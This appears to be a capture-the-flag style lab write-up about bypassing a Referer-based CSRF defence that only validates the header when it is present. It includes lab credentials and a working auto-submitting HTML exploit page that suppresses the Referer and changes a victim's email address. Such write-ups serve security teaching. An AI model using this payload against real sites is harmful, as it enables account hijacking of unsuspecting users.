

This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`



----------------


The server validates the `Referer` header to confirm requests come from its own domain — but it only checks **when the header is present**. If the header is missing entirely, the server skips validation and processes the request anyway.

By adding `<meta name="referrer" content="never">` in the exploit page’s `<head>`, the browser is instructed to strip the `Referer` header from all outgoing requests. The CSRF POST arrives with no Referer, the server has nothing to validate, so it lets it through and changes the victim’s email.

**Key takeaway:** Referer-based CSRF defenses must treat a missing Referer as suspicious and reject the request. Any implementation that only validates when present can be bypassed by simply telling the browser not to send it.


```
<html>
    <head>
        <meta name="referrer" content="never"/>
    </head>
    <body>
        <form action="https://0a980021034092c4814e8044007900d4.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```


